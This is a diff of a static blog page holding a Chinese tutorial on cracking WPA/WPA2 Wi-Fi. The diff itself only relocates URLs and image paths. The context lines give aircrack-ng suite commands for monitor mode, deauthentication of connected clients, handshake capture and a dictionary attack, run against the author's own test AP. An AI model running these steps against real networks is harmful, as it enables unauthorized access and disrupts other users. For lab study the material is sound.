@@ -47,7 +47,7 @@
 
 	<meta property="og:type" content="article">
 	<meta property="article:author" content="">
-	<meta property="og:url" content="https://jenihk.github.io/wificrack.html">
+	<meta property="og:url" content="https://jenihk.github.io/security/wificrack.html">
 	<meta property="og:title" content="wifi 破解">
 	<meta property="og:description" content="">
 	<meta property="og:image" content="https://jenihk.github.io/theme/images/posts/wificrack/cover.png">
@@ -128,7 +128,7 @@
 <p>下列操作在 Linux 上实现，window操作类似。</p>
 <p><strong><em>WPA/WPA2破解方法</em></strong></p>
 <p>首先我在另一台电脑上使用无线网卡模拟了一个 AP 环境，把它作为本次实验的目标，也就是我们需要破解的无线网。下图为该网络的信息</p>
-<p><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/tp-link.png" alt="tp-link" /></p>
+<p><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/tp-link.png" style="text-align:center" alt="tp-link" /></p>
 <p>执行破解步骤</p>
 <ol>
 <li>
@@ -145,22 +145,22 @@ ifconfig -a
 <pre>
 sudo ifconfig wlp4s0 up
 </pre>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-1.png" alt="aircrack-1" /></p>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-1.png" style="text-align:center" alt="aircrack-1" /></p>
 </li>
 <li>
 <p>开启监听模式,监听模式下适配器名称会变更，比如我的变成了 wlp4s0mon
 <pre>
 sudo airmon-ng start wlp4s0
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-2.png" alt="aircrack-2" /><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-3.png" alt="aircrack-3" /></p>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-2.png" style="text-align:center" alt="aircrack-2" /><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-3.png" style="text-align:center" alt="aircrack-3" /></p>
 </li>
 <li>
 <p>获取当前无线网概况，包括AP的SSID、MAC地址、工作频道、无线客户端MAC及数量等
 <pre>
 sudo airodump-ng wlp4s0mon
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-4.png"" alt="aircrack-4" /><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-4.png" style="text-align:center" alt="aircrack-4" /><br>
 记录下自己想要破解的wifi所在的频道，也就是 CH 那列的数字，然后可以 Ctrl+c 结束扫描,我们的目标是 SoftAP ,所以我们记下 1 这个信道</p>
 </li>
 <li>
@@ -170,7 +170,7 @@ sudo airodump-ng -c 1 –w log wlp4s0mon
 # -c 为目标AP的工作频道，我们要进行攻击测试的无线路由器工作频道为1；
 # -w 后跟要保存的文件名，名字随意。要注意的是：这里虽然设置的文件名是log，但是生成的文件却不是log.cap，而是log-01.cap，在进行第二次攻击时，若使用同样文件名log保存的话，就会生成名为log-02.cap的文件。
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-5.png" alt="aircrack-5" /></p>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-5.png" style="text-align:center" alt="aircrack-5" /></p>
 </li>
 <li>
 <p>打开一个新的终端，发送名叫“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端会自动重新连接无线路由器，我们也可以捕获到包含 WPA-PSK 4次握手验证的数据包了。
@@ -180,19 +180,19 @@ sudo aireplay-ng -0 1 –a 14:CF:92:DB:46:B3 -c CC:3A:61:C9:15:77 wlp4s0mon
 # -a 目标无线网的MAC地址；
 # -c 客户端的MAC地址；
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-6.png" alt="aircrack-6" /><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-6.png" style="text-align:center" alt="aircrack-6" /><br>
 回到 airodump-ng 界面，右上角会出现 “WPA handshake” 的提示，这表示获得到了包含WPA-PSK密码的4此握手数据报文</p>
 </li>
 <li>
 <p>成功获取到无线WPA-PSK验证数据报文后，就可以开始破解<br>
 此时终端所在工作路径目录内会有以下文件<br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-7.png" alt="aircrack-7" /><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-7.png" style="text-align:center" alt="aircrack-7" /><br>
 执行
 <pre>
 sudo aircrack-ng -w blackhat/wordlist1.dic log-01.cap
 # -w 后跟预先制作的字典
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-8.png" alt="aircrack-8" /><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-8.png" style="text-align:center" alt="aircrack-8" /><br>
 最后记得结束网卡的监听模式
 <pre>
 sudo airmon-ng stop wlp4s0mon
@@ -275,8 +275,8 @@ sudo aircrack-ng 捕获的 IVs 文件
             <div id="disqus_thread"></div>
             <script type="text/javascript">
                 var disqus_shortname = 'jenihk';
-                var disqus_identifier = 'wificrack.html';
-                var disqus_url = 'https://jenihk.github.io/wificrack.html';
+                var disqus_identifier = 'security/wificrack.html';
+                var disqus_url = 'https://jenihk.github.io/security/wificrack.html';
                 (function() {
                     var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                     dsq.src = '//jenihk.disqus.com/embed.js';
